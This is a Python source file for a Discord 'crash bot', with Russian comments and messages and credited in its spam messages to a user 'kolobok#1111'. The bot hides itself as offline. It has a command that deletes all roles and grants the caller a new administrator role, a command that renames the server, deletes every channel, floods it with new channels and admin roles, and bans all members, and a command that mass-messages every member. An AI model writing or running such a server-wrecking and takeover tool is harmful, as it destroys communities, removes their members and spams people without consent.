# -*- coding: utf8 -*-

import discord
from discord.ext import commands
import discord
from discord import utils
import json
import youtube_dl
import requests
import nacl
import config1

client = commands.Bot(command_prefix='-', self_bot=False)  # Префикс бота

@client.event
async def on_ready():
    print('Загружен краш бот: {0}!'.format(client.user))
    await client.change_presence(status=discord.Status.offline)


@client.command()
async def ping(ctx):
    ping_ = client.latency
    ping =  round(ping_ * 1000)
    await ctx.send(f"Мой пинг на сервере {ping}ms")

@client.command()
async def admroles(ctx):
    author = author = ctx.message.author
    for m in ctx.guild.roles:
        await author.send(m)

@client.command()
async def aminka(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass
    guild = ctx.guild
    perms = discord.Permissions(administrator=True)  # права роли
    await guild.create_role(name="Admin", permissions=perms, colour=discord.Colour(0xff0000), hoist=True)  # создаем роль
    role = discord.utils.get(ctx.guild.roles, name="Admin")  # находим роль по имени
    user = ctx.message.author  # находим юзера
    await user.add_roles(role)  # добовляем роль
    await ctx.message.delete()

@client.command(pass_context=True)
async def kalakaka(ctx, m):
    await ctx.guild.edit(name='Crashed!')
    await ctx.send('@everyone Краш начат by kolobok#1111')
    for member in ctx.guild.members:
        try:
            await member.send("Краш начат by kolobok#1111")
        except:
            continue
    failed = []
    counter = 0
    popo = int(m)
    for channel in ctx.guild.channels:  # собираем
        try:
            await channel.delete(reason="Краш by kolobok#1111")  # удаляем
        except:
            failed.append(channel.name)
        else:
            counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(
        f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")  # отпровляем отчёт отправителю команды
    count1 = 0
    print("Каналы удалены")
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('Краш by kolobok#1111')
        await guild.create_voice_channel('Краш by kolobok#1111')
        count1 += 1
    count = 0
    print("Созданы каналы")
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Краш by kolobok#1111")
        except:
            pass
    print("Роли удалены")
    count1 = 0
    while count1 < popo:
        guild = ctx.guild
        perms = discord.Permissions(administrator=True)  # права роли
        await ctx.guild.create_role(name="Краш by kolobok#1111", permissions=perms, colour=discord.Colour(0xff0000), hoist=True)
        count1 += 1
    print("Созданы роли")
    for member in ctx.guild.members:
        try:
            await member.send('Краш окончен by kolobok#1111')
        except:
            continue
    for member in ctx.guild.members:  # ban members
        try:
            await member.ban()
            await member.kick()
        except:
            continue
    print("Все забанены")

    print("Краш окончен")

@client.command(pass_context=True)
async def opo(ctx, *, args):
    await ctx.message.delete()
    author = ctx.message.author  # Объявляем переменную author и записываем туда информацию об авторе.
    args = args
    print(args)
    biba = (f'{author.mention} Оповещений отправлено  c текстом: {args}!')
    await ctx.send(biba)  # Выводим сообщение с упоминанием автора, обращаясь к переменной author.
    print("#0 Оповещение отправлено c текстом:", args)
    for member in ctx.guild.members:
        try:
            await member.send(args)
        except:
            continue



# RUN
client.run(config1.TOKEN)

